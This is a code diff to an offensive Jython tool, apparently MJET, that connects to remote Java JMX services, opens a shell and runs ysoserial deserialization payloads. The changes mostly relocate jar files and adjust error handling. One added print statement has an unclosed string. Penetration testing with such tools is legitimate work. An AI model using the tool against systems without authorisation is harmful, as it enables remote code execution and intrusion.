@@ -43,26 +43,12 @@ class TrustAllX509TrustManager(X509TrustManager):
 ### AUX ###
 def jmxmp_url(args):
     print "[+] Using JMX Message Protocol"
-    jarFile = "opendmk_jmxremote_optional_jar-1.0-b01-ea.jar"
-    if not os.path.isfile(jarFile):
-        print "[-] Error: Did not find opendmk_jmxremote_optional_jar-1.0-b01-ea.jar in this folder. Please download it from https://mvnrepository.com/artifact/org.glassfish.external/opendmk_jmxremote_optional_jar/1.0-b01-ea"
+    if not os.path.isfile("./jars/opendmk_jmxremote_optional_jar-1.0-b01-ea.jar"):
+        print "[-] Error: Did not find opendmk_jmxremote_optional_jar-1.0-b01-ea.jar in jars folder. Please download it from https://mvnrepository.com/artifact/org.glassfish.external/opendmk_jmxremote_optional_jar/1.0-b01-ea and move it into the jars folder"
+        print "[-] Example: java -cp jython.jar:jars/opendmk_jmxremote_optional_jar-1.0-b01-ea.jar org.python.util.jython mjet.py ..."
         sys.exit(1)
 
-    #  Source: https://stackoverflow.com/questions/5510939/jython-jmxmp-protocol-support/57377052#57377052
-    from java.net import URL, URLClassLoader
-    from java.lang import ClassLoader
-    from java.io import File
-
-    java_version = System.getProperty('java.version')
-    if java_version.split(".")[0] < 9:
-        m = URLClassLoader.getDeclaredMethod("addURL", [URL])
-        m.accessible = 1
-        m.invoke(ClassLoader.getSystemClassLoader(), [File(jarFile).toURL()])
-        print "[+] Imported opendmk_jmxremote_optional_jar-1.0-b01-ea.jar"
-    else:
-        print "[-] Your Java version is " + java_version
-        print "[-] Please use Java version < 9 for jmxmp"
-        sys.exit(1)
+    print "[+] Using opendmk_jmxremote_optional_jar-1.0-b01-ea.jar
         
     from javax.management.remote import JMXServiceURL
     jmx_url = JMXServiceURL("service:jmx:jmxmp://" +
@@ -112,7 +98,8 @@ def connectToJMX(args):
         print "[+] Connected: " + str(jmx_connector.getConnectionId())
         bean_server = jmx_connector.getMBeanServerConnection()
         return bean_server
-    except:
+    except Exception as e:
+        print e
         print "[-] Error: Can't connect to remote service"
 
         if "Authentication failed! Invalid username or password" in str(sys.exc_info()[1]):
@@ -395,11 +382,11 @@ def startShell(password, bean_server):
 
 def deserializationMode(args):
 
-    if not os.path.isfile('./ysoserial.jar'):
-        print "[-] Error: Did not find ysoserial.jar in this folder. Please download it from https://github.com/frohoff/ysoserial"
+    if not os.path.isfile('./jars/ysoserial.jar'):
+        print "[-] Error: Did not find ysoserial.jar in jars folder. Please download it from https://github.com/frohoff/ysoserial and move it in the jars folder"
         sys.exit(1)
 
-    sys.path.append("./ysoserial.jar")
+    sys.path.append("./jars/ysoserial.jar")
     print "[+] Added ysoserial API capacities"
 
     from ysoserial.payloads.ObjectPayload import Utils
